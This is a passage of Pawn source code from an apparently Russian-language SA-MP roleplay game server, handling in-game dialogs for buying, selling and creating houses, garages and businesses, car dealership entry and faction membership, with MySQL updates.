	case DIALOG_REALTOR_INFO_BIZ:
	{
		if(response)
		{
			new businessid = strval(inputtext);

			if(strlen(inputtext) && IsNumeric(inputtext) && (0 <= businessid <= TOTALBIZZ-1))
			{
				if(GetMoney(playerid) < 100)
					return SendMess(playerid, MSG_NOT_MONEY);

				GiveMoney(playerid, -100);

				ShowPlayerInfoBizDialog(playerid, businessid);

				g_player_listitem_use[playerid] = businessid;
			}
		}
	}

	case DIALOG_REALTOR_INFO_GARAGE:
	{
		if(response)
		{
			new garageid = strval(inputtext);

			if(strlen(inputtext) && IsNumeric(inputtext) && (0 <= garageid <= TOTALGARAGES-1))
			{
				if(GetMoney(playerid) < 100)
					return SendMess(playerid, MSG_NOT_MONEY);

				GiveMoney(playerid, -100);

				ShowPlayerInfoGarageDialog(playerid, garageid);

				g_player_listitem_use[playerid] = garageid;
			}
		}
	}

	case DIALOG_REALTOR_HOUSE_PHOTO:
	{
		if(response)
		{
			if(GetMoney(playerid) < 100)
				return SendMess(playerid, MSG_NOT_MONEY);

			GiveMoney(playerid, -100);

			new houseid = g_player_listitem_use[playerid];

			PI[playerid][P_REALTOR_TYPE] = REALTOR_TYPE_HOUSE;

			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, playerid + 3000);
			TogglePlayerSpectating(playerid, true);

			SetTimerEx("ShowPlayerMakePhoto", 1000, false, "iii", playerid, PI[playerid][P_REALTOR_TYPE], houseid);
		}
	}

	case DIALOG_REALTOR_BIZ_PHOTO:
	{
		if(response)
		{
			if(GetMoney(playerid) < 100)
				return SendMess(playerid, MSG_NOT_MONEY);

			GiveMoney(playerid, -100);

			new businessid = g_player_listitem_use[playerid];

			PI[playerid][P_REALTOR_TYPE] = REALTOR_TYPE_BIZ;

			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, playerid + 3000);
			TogglePlayerSpectating(playerid, true);

			SetTimerEx("ShowPlayerMakePhoto", 1000, false, "iii", playerid, PI[playerid][P_REALTOR_TYPE], businessid);
		}
	}

	case DIALOG_REALTOR_GARAGE_PHOTO:
	{
		if(response)
		{
			if(GetMoney(playerid) < 100)
				return SendMess(playerid, MSG_NOT_MONEY);

			GiveMoney(playerid, -100);

			new garageid = g_player_listitem_use[playerid];

			PI[playerid][P_REALTOR_TYPE] = REALTOR_TYPE_GARAGE;

			SetPlayerInterior(playerid, 0);
			SetPlayerVirtualWorld(playerid, playerid + 3000);
			TogglePlayerSpectating(playerid, true);

			SetTimerEx("ShowPlayerMakePhoto", 1000, false, "iii", playerid, PI[playerid][P_REALTOR_TYPE], garageid);
		}
	}

	case DIALOG_AHELP:
	{
		if(response)
		{
			if(pPressed[playerid] == 9) return 1;
			else pPressed[playerid] ++;

			ShowPlayerDialogAdminCommands(playerid, pPressed[playerid]);
		}
	}

	case DIALOG_GARAGE_MENU:
	{
	    if(!response) return 1;

	    new garage_id = GetPlayerGarage(playerid);

	    if(!garage_id) return 1;

	    switch(listitem + 1)
	    {
	        case 1: // Продать государству
	        {
	            PI[playerid][pCash] += (g_garages[garage_id][G_PRICE] / 100) * 80;

				format(g_garages[garage_id][G_OWNER], 21, "None");

				new fmt_text[256];

				mysql_format(dbHandle, fmt_text, sizeof fmt_text, "UPDATE garages g, accounts a SET g.owner='None', a.cash=%d WHERE g.id=%d AND a.name='%s'", PI[playerid][pCash], g_garages[garage_id][G_SQL_ID], GetName(playerid));
				mysql_tquery(dbHandle, fmt_text);

				format(fmt_text, sizeof fmt_text, "Вы успешно продали гараж №%d за 80 процентов от его стоимости {FFFF00}(%d руб.)", g_garages[garage_id][G_SQL_ID], (g_garages[garage_id][G_PRICE] / 100) * 80);
				SendClientMessage(playerid, 0x66CC33FF, fmt_text);

				UpdateGarage(garage_id);

				for(new idx; idx < MAX_PLAYER_OWNABLE_CARS; idx ++)
				{
					if(PI[playerid][P_OWNABLE_CAR][idx] == INVALID_PLAYER_ID)
						continue;

					new vehicleid = PI[playerid][P_OWNABLE_CAR][idx];

					if(1000 < GetVehicleData(vehicleid, veh_virtual) < 10000)
					{
						SendClientMessage(playerid, C_BLUE, "Ваш транспорт был перепаркован у Анашана");

						new r = random(sizeof SalonRandSpawn);

						STRING_GLOBAL[0] = EOS;
						mysql_format(dbHandle, STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE ownable_cars SET pos_x=%f, pos_y=%f, pos_z=%f, pos_r=%f WHERE id=%d",SalonRandSpawn[r][0], SalonRandSpawn[r][1], SalonRandSpawn[r][2], SalonRandSpawn[r][3], GetVehicleData(vehicleid, veh_sql_id));
						mysql_query(dbHandle, STRING_GLOBAL);

						UnLoadPlayerOwnableCar(playerid, idx);
					}
				}
	        }

	        case 2:
	        {
	            new fmt_text[6] = "Гараж";

				GPSPlayer_(playerid, g_garages[garage_id][G_POS_X], g_garages[garage_id][G_POS_Y], g_garages[garage_id][G_POS_Z], fmt_text);
	        }
	    }

	    return 1;
	}

	case DIALOG_GARAGE_CREATE:
	{
	    if(!response) return callcmd::add(playerid, "");

	    new price = strval(inputtext);

	    if(!(1 <= price <= 20000000))
	    {
	        SendClientMessage(playerid, COLOR_GREY, "Стоимость должна быть от 1 до 20.000.000");

	        ShowPlayerDialog(playerid, DIALOG_GARAGE_CREATE, DIALOG_STYLE_INPUT, "Добавить гараж", "{ffffff}\n\nЧтобы создать гараж, введите его стоимость в окно ниже:\n\n ", "Далее", "Отмена");

			return 1;
	    }

	    new garage_id = ++ TOTALGARAGES,
	        Float: x,
	        Float: y,
	        Float: z,
	        Float: angle,
	        fmt_text[128],
	        Cache: result;

	    GetPlayerPos(playerid, x, y, z);
	    GetPlayerFacingAngle(playerid, angle);

	    g_garages[garage_id][G_POS_X] = x;
	    g_garages[garage_id][G_POS_Y] = y;
	    g_garages[garage_id][G_POS_Z] = z;
	    g_garages[garage_id][G_ANGLE] = angle;

	    g_garages[garage_id][G_PRICE] = price;

	    format(g_garages[garage_id][G_OWNER], 21, "None");

		mysql_format(dbHandle, fmt_text, sizeof fmt_text, "INSERT INTO "T_GARAGES" (pos_x, pos_y, pos_z, angle, price) VALUES ('%f', '%f', '%f', '%f', %d)", x, y, z, angle, price);
	    result = mysql_query(dbHandle, fmt_text, true);

	    g_garages[garage_id][G_SQL_ID] = cache_insert_id();

	    cache_delete(result);

	    format(fmt_text, sizeof fmt_text, "Гараж успешно создан {FFFF00}(SERVER_ID: %d / SQL_ID: %d)", garage_id, g_garages[garage_id][G_SQL_ID]);
	    SendClientMessage(playerid, 0x3399FFFF, fmt_text);

	    UpdateGarage(garage_id);

	    // printf("pickup id: %d", g_garages[garage_id][G_PICKUP]);

	    return 1;
	}
	case D_ADDNED+1:
		{
			if(response)
			{
				new type, Float:x,Float:y,Float:z;
				if(sscanf(inputtext,"i",type))
				{
					new string[150];
					STRING_GLOBAL[0] = EOS;
					strcat(string,"ВАЖНО: Тип интерьера\n\nПРИМЕР: 1\n\n");
					strcat(STRING_GLOBAL,"1. Низкий класс\n");
					strcat(STRING_GLOBAL,"2. Средний класс\n");
					strcat(STRING_GLOBAL,"3. Высокий класс\n");
					strcat(STRING_GLOBAL,"4. Семейный дом");
					return ShowPlayerDialog(playerid,D_ADDNED+1,1,"Добавить дом",STRING_GLOBAL,"Выбрать","Закрыть");
				}
				TOTALHOUSE++;
				GetPlayerPos(playerid,x,y,z);
				HouseInfo[TOTALHOUSE][hEntrx] = x;
				HouseInfo[TOTALHOUSE][hEntry] = y;
				HouseInfo[TOTALHOUSE][hEntrz] = z;
				new string[90];
				switch(type)
				{
					case 1: format(string,90,"636.4415,-989.4935,627.7263,1,3");
					case 2: format(string,90,"261.5686,86.0956,923.2872,2,3");
					case 3: format(string,90,"461.1176,85.6811,923.2638,3,3");
					case 4: format(string,90,"-176.1625,-18.5236,304.7480,4,10");
				}
				sscanf(coordh,"p<,>ffff",
				HouseInfo[TOTALHOUSE][hCarx],HouseInfo[TOTALHOUSE][hCary],HouseInfo[TOTALHOUSE][hCarz],HouseInfo[TOTALHOUSE][hCarfa]);
				sscanf(string,"p<,>fffii",
				HouseInfo[TOTALHOUSE][hExitx],HouseInfo[TOTALHOUSE][hExity],HouseInfo[TOTALHOUSE][hExitz],
				HouseInfo[TOTALHOUSE][hDiscript],HouseInfo[TOTALHOUSE][hInt]);
				HouseInfo[TOTALHOUSE][hVirtual] = TOTALHOUSE;

				new tmpvar;
				switch(HouseInfo[TOTALHOUSE][hDiscript])
				{
                    case 1: tmpvar = 400000;
                    case 2: tmpvar = 800000;
                    case 3: tmpvar = 1600000;
					case 4: tmpvar = 3000000;
				}
				HouseInfo[TOTALHOUSE][hPrice] = tmpvar;

				strmid(HouseInfo[TOTALHOUSE][hOwner], "None", 0, strlen("None"), MAX_PLAYER_NAME);
				HouseInfo[TOTALHOUSE][hMIcon] = CreateDynamicMapIcon(HouseInfo[TOTALHOUSE][hEntrx], HouseInfo[TOTALHOUSE][hEntry], HouseInfo[TOTALHOUSE][hEntrz], 31, 0,-1,-1,-1,150.0);
				HouseInfo[TOTALHOUSE][hPickup] = CreatePickup(1273,1, HouseInfo[TOTALHOUSE][hEntrx], HouseInfo[TOTALHOUSE][hEntry], HouseInfo[TOTALHOUSE][hEntrz]);
				HouseInfo[TOTALHOUSE][hPickupExit] = CreateDynamic3DTextLabel("{FFFFFF}Для входа введите:\n{FFCC00}/exit\n{FFFFFF}Управление домом: \n{0099FF}/hmenu",COLOR_WHITE,HouseInfo[TOTALHOUSE][hExitx], HouseInfo[TOTALHOUSE][hExity], HouseInfo[TOTALHOUSE][hExitz],2.0,INVALID_PLAYER_ID,INVALID_VEHICLE_ID,1,HouseInfo[TOTALHOUSE][hVirtual],HouseInfo[TOTALHOUSE][hInt]);

                STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL,sizeof(STRING_GLOBAL),"INSERT INTO "T_HOUSE" (id,hEntrx,hEntry,hEntrz,hExitx,hExity,hExitz,carx,cary,carz,carfa,hDiscript,hPrice,hInt,hVirtual)\
				VALUES (%d,'%f','%f','%f','%f','%f','%f','%f','%f','%f','%f','%d',%d,%d,%d)",
				TOTALHOUSE,
				HouseInfo[TOTALHOUSE][hEntrx],HouseInfo[TOTALHOUSE][hEntry],HouseInfo[TOTALHOUSE][hEntrz],
				HouseInfo[TOTALHOUSE][hExitx],HouseInfo[TOTALHOUSE][hExity],HouseInfo[TOTALHOUSE][hExitz],
				HouseInfo[TOTALHOUSE][hCarx],HouseInfo[TOTALHOUSE][hCary],HouseInfo[TOTALHOUSE][hCarz],HouseInfo[TOTALHOUSE][hCarfa],
				HouseInfo[TOTALHOUSE][hDiscript],HouseInfo[TOTALHOUSE][hPrice],HouseInfo[TOTALHOUSE][hInt],HouseInfo[TOTALHOUSE][hVirtual]);
				mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
				if(HouseInfo[TOTALHOUSE][hDiscript] != 4) UpdateCupboard(TOTALHOUSE);
				SendMes(playerid,COLOR_LIME,"Дом №%d Успешно создан",TOTALHOUSE);
				return 1;
			}
			TPC[playerid] = false;
		}
	case D_ADDNED+4:
		{
			if(!response) return 1;

			// Магазин 24/7\nЗаправка\\nРиэлторское агентство\nТранспортная компания\nАвтосалон (легковые)\nАвтосалон (грузовики)\nСвободно\nБар\nАммуниция\nКлуб\nСТО\nМагазин одежды\nКазино
			switch(listitem)
			{
				case 0: format(boordh,sizeof(boordh),"786.9673,-279.3357,1034.9054,6,56,1"); // 24/7
				case 1: format(boordh,sizeof(boordh),"0.0,0.0,0.0,0,47,2"); // FUEL
				case 2: format(boordh,sizeof(boordh),"-721.3050, 225.4088, 2022.7360,5,29,3");
				case 3: format(boordh,sizeof(boordh),"1067.8795,1911.6483,3026.7639,10,10,9"); //Риэлторское агенство
				case 4: format(boordh,sizeof(boordh),"635.0557,-1129.7681,1081.4840,9,51,10"); // инт иконка тип 10005
				case 5: format(boordh,sizeof(boordh),"548.0505,153.8953,1001.6217,17,48,11"); // легковые
				case 6: format(boordh,sizeof(boordh),"499.9076,-164.4674,861.8495,3,48,12"); // грузовики
				case 7: format(boordh,sizeof(boordh),"1204.7395,-13.8515,1000.9219,2,48,4");
				case 8: format(boordh,sizeof(boordh),"-1501.3638, -296.6272, 1762.5275,11,49,5");
				case 9: format(boordh,sizeof(boordh),"540.2840,-842.7768,1002.0000,7,18,6"); // AMMO
				case 10: format(boordh,sizeof(boordh),"-187.2723, 882.1444, 2612.5525,5,10,4"); // НОВЫЙ КЛУБ
				case 11: format(boordh,sizeof(boordh),"0.0,0.0,0.0,0,27,7"); // CTO
				case 12: format(boordh,sizeof(boordh),"-913.9672,1200.9209,1002.0200,5,45,8"); // Магазин одежды
				case 13: format(boordh,sizeof(boordh),"1690.1354,2068.0659,-7.8350,1,25,9"); // Казино
			}
			ShowPlayerDialog(playerid, D_HEAL+6, 1, "Бизнес", "ВАЖНО: Название\n\nПРИМЕР: Gas Station", "Принять", "Отмена");
		}
  		case 69:
		{
		    if(response) FirstReferal[playerid] += 10;
		    else
		    {
		        if(FirstReferal[playerid] >= 10) FirstReferal[playerid] -= 10;
		        else return true;
		    }
		    new fmt_str[600], Name[24], Level;
		    format(fmt_str, sizeof(fmt_str), "SELECT `name`, `level` FROM `accounts` WHERE `referal` = '%s' LIMIT %i, 10", GetName(playerid), FirstReferal[playerid]);
		    new Cache:result = mysql_query(dbHandle, fmt_str);
			STRING_GLOBAL = "";
      		new accounts = cache_get_row_count(dbHandle);
      		if(accounts == 0) return SendClientMessage(playerid, COLOR_GREY, "[Ошибка] {FFFFFF}Больше вас никто не указывал как реферала");
      		for(new i; i < accounts; i ++)
      		{
	  			cache_get_row(i, 0, Name, dbHandle);
	  			Level = cache_get_row_int(i, 1, dbHandle);

      			if(Level < 3) format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "%s{FFFFFF}%i. %s - {FF0000}%d level\n", STRING_GLOBAL, i+FirstReferal[playerid]+1, Name, Level);
      			else format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "%s{FFFFFF}%i. %s - {33AA33}%d level\n", STRING_GLOBAL, i+FirstReferal[playerid]+1, Name, Level);
      		}
      		cache_delete(result, dbHandle);
  			ShowPlayerDialogEx(playerid, 69, 0, "Приглашенные", STRING_GLOBAL, "Далее", "Назад");
		}
	case D_ADDNED+5:
		{
			if(PlayerLogged[playerid] == false) return 1;
			if(!IsPlayerDeveloperAdmin(playerid)) return 1;
			if(TOTALATM >= MAX_ATM-2) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете больше устанавливать банкоматы!");
			if(GetPVarInt(playerid, "LoadATM") > 0) return SendClientMessage(playerid, COLOR_GREY, "Вы уже устанавливаете банкомат!");
			ShowPlayerDialog(playerid, D_ATM+9, 0, "Добавить банкомат", "Вы хотите начать установку банкомата?", "Да", "Нет");
			return 1;
		}
  	case D_JOINHOUSE:
		{
			if(!response) return 1;

			new idx = GetPVarInt(playerid, "PlayerHouse");

			if(!strcmp(HouseInfo[idx][hOwner], "None", true))
			{
				if(PI[playerid][pCash] < HouseInfo[idx][hPrice])
					return SendMess(playerid, MSG_NOT_MONEY);

				else
				{
					new house = 0;

					for(new i = TOTALHOUSE; i > 0; i --)
					{
						if(!strcmp(HouseInfo[i][hOwner], GetName(playerid), true)) house++;
					}

					if(house != 0)
						return SendClientMessage(playerid, COLOR_GREY, "У Вас уже есть дом!");

    				else
					{
						GiveMoney(playerid, -HouseInfo[idx][hPrice]);
						SendMes(playerid, COLOR_GREEN, "Вы купили дом за %iр. У Вас осталось: %iр",HouseInfo[idx][hPrice], PI[playerid][pCash]);
					}

					HouseInfo[idx][hBuyPrice] = HouseInfo[idx][hPrice] / 2;
					HouseInfo[idx][hOplata] = 1;
					HouseInfo[idx][hLock] = 0;

					SendClientMessage(playerid, COLOR_YELLOW, "Ваш домашний счет проплачен на 1 день, рекомендуем Вам оплатить дом");
					SendMes(playerid, COLOR_YELLOW, "Стоимость кварплаты для вашего дома будет составлять %dр в сутки",GetHomeOplata(idx));

					strmid(HouseInfo[idx][hOwner], GetName(playerid), 0, strlen(GetName(playerid)), MAX_PLAYER_NAME);

					if(PI[playerid][P_FAMILY] != 0 && HouseInfo[idx][hInt] == 10)
					{
						SendClientMessage(playerid, C_OSNOV, "Вы можете установить этот дом как спавн в своей семье. Для этого воспользуйтесь: /family");

						new familyid = PI[playerid][P_FAMILY];

						SetFamilyData(familyid, F_STORE_LABEL, CreateDynamic3DTextLabel("Склад", 0xFFFF00FF, 498.0487,-2.2444,1904.9518+1.0, 10.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, HouseInfo[idx][hVirtual], HouseInfo[idx][hInt]));
						UpdateHouseFamilyLabel(familyid);
					}

                    STRING_GLOBAL[0] = EOS;

					format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_HOUSE" SET hOwner = '%s', hOplata = %i, buyprice = %i, hLock = %i WHERE id = '%d' LIMIT 1", HouseInfo[idx][hOwner], GetHomeOplata(idx)*2, HouseInfo[idx][hBuyPrice], HouseInfo[idx][hLock], idx);
					mysql_tquery(dbHandle, STRING_GLOBAL, "", "");

					PI[playerid][pSpawnChange] = 1;
					MysqlUpdatePlayerInt(playerid, "spawnchange", PI[playerid][pSpawnChange]);

					UpdateHouse(idx);

					return 1;
				}
			}

			else
			{
				if(HouseInfo[idx][hLock] == 1)
				{
					if(strcmp(GetName(playerid), HouseInfo[idx][hOwner], true) == 0)
						ShowPlayerDialog(playerid, D_JOB+14, 0, "Дом", "{FFFFFF}Ваш дом закрыт\n\nвы хотите его открыть?", "Да", "Нет");

					GameTextForPlayer(playerid, "~r~Locked", 5000, 1);
				}

				else
				{
                    FreezePlayer(playerid, 3000);

					SetPlayerPos(playerid,HouseInfo[idx][hExitx],HouseInfo[idx][hExity],HouseInfo[idx][hExitz]);

					SetPlayerInterior(playerid,HouseInfo[idx][hInt]);
					SetPlayerVirtualWorld(playerid,HouseInfo[idx][hVirtual]);
				}
			}
		}
		case D_SELLHOUSE:
		{
		    if(!response) return callcmd::home(playerid);
			new i = GetPVarInt(playerid, "PlayerHouse");
			strmid(HouseInfo[i][hOwner], "None", 0, strlen("None"), MAX_PLAYER_NAME);
			PI[playerid][pSpawnChange] = 0;
			MysqlUpdatePlayerInt(playerid, "spawnchange", PI[playerid][pSpawnChange]);
			MysqlUpdateHouseStr(i, "hOwner", "None");
			HouseInfo[i][hLock] = 1;
			HouseInfo[i][hOplata] = HouseInfo[i][hGarage] = HouseInfo[i][hAutoDoors] = 0;
			SendMes(playerid, COLOR_RED, "Вы продали свой дом государству за %d руб. Деньги переведены в банк",HouseInfo[i][hBuyPrice]);
			PI[playerid][pBank] += HouseInfo[i][hBuyPrice];
			MysqlUpdatePlayerInt(playerid, "bank", PI[playerid][pBank]);
			UpdateHouse(i);

			STRING_GLOBAL[0] = EOS;
			format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_HOUSE" SET  hOwner = '%s', buyprice = 0, hLock = %d, hOplata = 0, hGarage = 0, hAutoDoors = 0 WHERE id = '%d' LIMIT 1", HouseInfo[i][hOwner], HouseInfo[i][hLock], i);
			mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
			if(GetPlayerVirtualWorld(playerid) == HouseInfo[i][hVirtual])
			{
				SetPlayerInterior(playerid, 0);
				SetPlayerVirtualWorld(playerid, 0);
				SetPlayerPos(playerid, HouseInfo[i][hEntrx], HouseInfo[i][hEntry], HouseInfo[i][hEntrz]);
				DeletePVar(playerid, "PlayerHouse");
			}
		}
		case D_SELLHOUSE+1:
		{
			if(response)
			{
				if(!IsPlayerConnected(HouseOffer[playerid])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
				if(PlayerLogged[HouseOffer[playerid]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
				if(GetMoney(playerid) < HousePrice[playerid])
				{
					SendMes(HouseOffer[playerid], COLOR_GREY, "У %s недостаточно средств!", GetName(playerid));
					HouseOffer[playerid] = -1;
					HousePrice[playerid] = 0;
					return SendMess(playerid, MSG_NOT_MONEY);
				}

				GiveMoney(HouseOffer[playerid], -HousePrice[playerid]);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_HOUSE" SET hOwner = '%s', hLock = 1, hOplata = 0 WHERE id = '%d' LIMIT 1", GetName(HouseOffer[playerid]), GetPVarInt(playerid, "PlayerHouse"));
				mysql_tquery(dbHandle, STRING_GLOBAL, "", "");

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "UPDATE "T_HOUSE" SET hOwner = '%s', hLock = 1, hOplata = 0 WHERE id = '%d' LIMIT 1", GetName(playerid), GetPVarInt(HouseOffer[playerid], "PlayerHouse"));
				mysql_tquery(dbHandle, STRING_GLOBAL, "", "");
				strmid(HouseInfo[GetPVarInt(HouseOffer[playerid], "PlayerHouse")][hOwner],GetName(playerid), 0, strlen(GetName(playerid)), MAX_PLAYER_NAME);
				strmid(HouseInfo[GetPVarInt(playerid, "PlayerHouse")][hOwner],GetName(HouseOffer[playerid]), 0, strlen(GetName(HouseOffer[playerid])), MAX_PLAYER_NAME);
				HouseInfo[GetPVarInt(HouseOffer[playerid], "PlayerHouse")][hLock] = 1;
				HouseInfo[GetPVarInt(playerid, "PlayerHouse")][hLock] = 1;
				HouseInfo[GetPVarInt(HouseOffer[playerid], "PlayerHouse")][hOplata] = 1;
				HouseInfo[GetPVarInt(playerid, "PlayerHouse")][hOplata] = 1;
				SetPVarInt(playerid, "PlayerHouse", GetPVarInt(HouseOffer[playerid], "PlayerHouse"));
				SetPVarInt(HouseOffer[playerid], "PlayerHouse", GetPVarInt(playerid, "PlayerHouse"));

				SendMes(playerid, COLOR_GREEN, "Вы обменялись домами с %s. Доплата: %d руб", GetName(HouseOffer[playerid]),HousePrice[playerid]);
				SendMes(HouseOffer[playerid], COLOR_GREEN, "Вы обменялись домами с %s. Ваша доплата: %d руб", GetName(playerid),HousePrice[playerid]);
				SendClientMessage(playerid, COLOR_YELLOW, "Ваш домашний счет проплачен на 1 дней, рекомендуем вам оплатить дом");
				SendClientMessage(HouseOffer[playerid], COLOR_YELLOW, "Ваш домашний счет проплачен на 1 дней, рекомендуем вам оплатить дом");
				HouseOffer[playerid] = -1;
				HousePrice[playerid] = 0;
				PI[playerid][pSpawnChange] = 0;
				MysqlUpdatePlayerInt(playerid, "spawnchange", PI[playerid][pSpawnChange]);
			}
			else SendMes(HouseOffer[playerid], COLOR_RED, "%s отклонил предложение обменяться домами с вами", GetName(playerid));
		}
     case D_JOINCARS:
		{
			if(response)
			{
				if(g_player_skills[playerid][S_LICS][0] == 0)
					return SendClientMessage(playerid, C_RED, "У Вас нет водительских прав");

				SendClientMessage(playerid, COLOR_GREEN, "Добро пожаловать в автосалон");

				if(IsPlayerInRangeOfPoint(playerid, 1.0, -20.8377,527.4447,11.1016)) {
					PI[playerid][P_SALON] = 0;
				}
				if(IsPlayerInRangeOfPoint(playerid, 1.0, 2327.862060, -1829.14270, 22.54274))	{
					PI[playerid][P_SALON] = 1;
				}
				if(IsPlayerInRangeOfPoint(playerid, 1.0, 2000.8680,2739.1086,12.2500))	{
					PI[playerid][P_SALON] = 2;
				}

				pPressed[playerid] = 0;
				PI[playerid][P_COLOR][0] =
				PI[playerid][P_COLOR][1] = 0;

				new idx = pPressed[playerid];

				//PI[playerid][P_SALON] = BizzInfo[ GetPVarInt(playerid, "PlayerBizz") ][bType] == 11 ? 0 : 1;

				printf("world: %d salon: %d", GetPlayerVirtualWorld(playerid), PI[playerid][P_SALON]);

				InShop[playerid] = PI[playerid][P_SALON];
				InShop[playerid] ++;

				new salon = PI[playerid][P_SALON];

				PI[playerid][SalonCarID] = CreateVehicle(car_market_data[salon][idx][0], 648.3561,83.0103,20.1347,312.0086, PI[playerid][P_COLOR][0], PI[playerid][P_COLOR][1], 10000);

				SetPlayerInterior(playerid,3);
				SetPlayerVirtualWorld(playerid,playerid);
				TogglePlayerControllable(playerid,false);
				LinkVehicleToInterior(PI[playerid][SalonCarID],3);
				SetVehicleVirtualWorld(PI[playerid][SalonCarID],playerid);
				PutPlayerInVehicle(playerid,PI[playerid][SalonCarID],0);

				pPressed[playerid] = 0;

				for(new i = 0; i != sizeof autosalon_td; i ++)
					TextDrawShowForPlayer(playerid, autosalon_td[i]);

				PlayerTextDrawShow(playerid, autosalon_ptd_first[playerid]);
				PlayerTextDrawShow(playerid, autosalon_ptd_second[playerid]);

				SetPlayerPos(playerid, -365.1710,384.8107,1002.0200);

				SetPlayerCameraPos(playerid, 655.419677, 84.478637, 21.507215);
				SetPlayerCameraLookAt(playerid, 650.651428, 83.572616, 20.306032);

				SelectTextDraw(playerid, 0x009900FF);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%s", g_vehicle_info[car_market_data[PI[playerid][P_SALON]][idx][0]-400][VI_NAME]);
				PlayerTextDrawSetString(playerid, autosalon_ptd_first[playerid], STRING_GLOBAL);

				STRING_GLOBAL[0] = EOS;
				format(STRING_GLOBAL, sizeof STRING_GLOBAL, "%d_Р", g_vehicle_info[car_market_data[PI[playerid][P_SALON]][idx][0]-400][VI_COST]);
				PlayerTextDrawSetString(playerid, autosalon_ptd_second[playerid], STRING_GLOBAL);

				printf("world: %d salon: %d 1", GetPlayerVirtualWorld(playerid), PI[playerid][P_SALON]);
			}
		}
	case D_INVITEFRAC:
		{
		    if(!response)
			{
			    DeletePVar(playerid, "offerplayer");
				DeletePVar(playerid, "offerfractionid");
			    return 1;
			}
			new fractionid = GetPVarInt(playerid, "offerfractionid");
			new offer = GetPVarInt(playerid, "offerplayer");
			new mes[128];
			for(new i; i < 8; i++)
			{
				new skinid = Fraction_Skin[fractionid][i];
				if(!skinid) break;
				if(!i) format(mes, sizeof(mes), "Одежда %d", i+1, skinid);
				else format(mes, sizeof(mes), "%s\nОдежда %d", mes, i+1, skinid);
			}
			SendClientMessage(playerid, COLOR_BLUE, "Ждите, пока лидер выберет одежду для Вас");
			ShowPlayerDialog(offer, D_INVITESKIN, 2, "Выбор скина", mes, "Принять", "");
		}
	case D_INVITESKIN:
	    {
	        if(!response) return 1;
	        new actplayerid = GetPVarInt(playerid, "actplayerid");
			new fractionid = GetPVarInt(actplayerid, "offerfractionid");
			new skinid = Fraction_Skin[fractionid][listitem];
			SendMes(actplayerid, COLOR_BLUE, "Вы присоединились к организации \"%s\"", Fraction_Name[fractionid]);
			SendMes(playerid, COLOR_BLUE, "%s принял предложение присоединиться к \"%s\"", GetName(actplayerid), Fraction_Name[fractionid]);
			PI[actplayerid][pMember] = fractionid;
			PI[actplayerid][pRank] = 1;
			PI[actplayerid][pMemberSkin] = skinid;
			MysqlUpdatePlayerInt(actplayerid, "memberskin", PI[actplayerid][pMemberSkin]);
			MysqlUpdatePlayerInt(actplayerid, "member", PI[actplayerid][pMember]);
			MysqlUpdatePlayerInt(actplayerid, "rank", PI[actplayerid][pRank]);

			printf("INVTTE %s[%d] member: %d rank: %d mskin: %d", GetName(actplayerid), PI[actplayerid][pMember], PI[actplayerid][pRank], PI[actplayerid][pMemberSkin]);

			SetPlayerSkin(actplayerid, skinid);
			PI[actplayerid][pJob] = 0;
			MysqlUpdatePlayerInt(actplayerid, "job", PI[actplayerid][pJob]);
			SetPlayerColorEx(actplayerid, TeamColors[GetTeamID(actplayerid)]);
  			ResetPlayerWeapons(actplayerid);
		}
	case D_WEATHER:
		{
			if(!response) return 1;
			SetWeather(listitem+1);
			SendClientMessage(playerid, COLOR_LIME, "Погода установлена");
		}
	case D_FRACMENU:
		{
            if(!response) return DeletePVar(playerid, "actplayerid");
            SetPVarInt(playerid, "actfraction", listitem+1);
            new fractionid = GetPVarInt(playerid, "actfraction");
            if(fractionid >= 13 && fractionid <= 14)
			{
				DeletePVar(playerid, "actplayerid");
				DeletePVar(playerid, "actfraction");
				return 1;
			}
			new mes[128];
			for(new i; i < 8; i++)
			{
				new skinid = Fraction_Skin[fractionid][i];
				if(!skinid) break;
				if(!i) format(mes, sizeof(mes), "Одежда %d", i+1, skinid);
				else format(mes, sizeof(mes), "%s\nОдежда %d", mes, i+1, skinid);
			}
			ShowPlayerDialog(playerid, D_LEADERSKIN, 2, "Выбор скина", mes, "Принять", "Отмена");
		}
	case D_LEADERSKIN:
	    {
			if(!response)
			{
				DeletePVar(playerid, "actplayerid");
				DeletePVar(playerid, "actfraction");
				return 1;
			}
			new string[128];
			new actplayerid = GetPVarInt(playerid, "actplayerid");
	        new fractionid = GetPVarInt(playerid, "actfraction");
	        new skinid = Fraction_Skin[fractionid][listitem];
			if(!IsPlayerConnected(actplayerid)) return SendMess(playerid, MSG_PLAYER_OFFLINE);
			else if(!PlayerLogged[actplayerid]) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
			switch(fractionid)
			{
			    case TEAM_ARMIYA,TEAM_POLICIA,TEAM_POLICIA2,TEAM_SWAT: PI[actplayerid][pRank] = 10;
			    case TEAM_FBI: PI[actplayerid][pRank] = 10;
			    case TEAM_MERIA,TEAM_VDV,TEAM_PRAVO,TEAM_BOLNICA,TEAM_SFHOSPITAL,TEAM_LVHOSPITAL,TEAM_GROOVE..TEAM_VAGOS,TEAM_OPG1..TEAM_YAK,TEAM_SMI,TEAM_SFNEWS,TEAM_LVNEWS: PI[actplayerid][pRank] = 10;
			    case TEAM_AUTOSCHOOL: PI[actplayerid][pRank] = 8;
			}
			PI[actplayerid][pLeader] = PI[actplayerid][pMember] = fractionid;
			PI[actplayerid][pLWarn] =
			PI[actplayerid][pJob] = 0;
			PI[actplayerid][pSpawnChange] = 2;
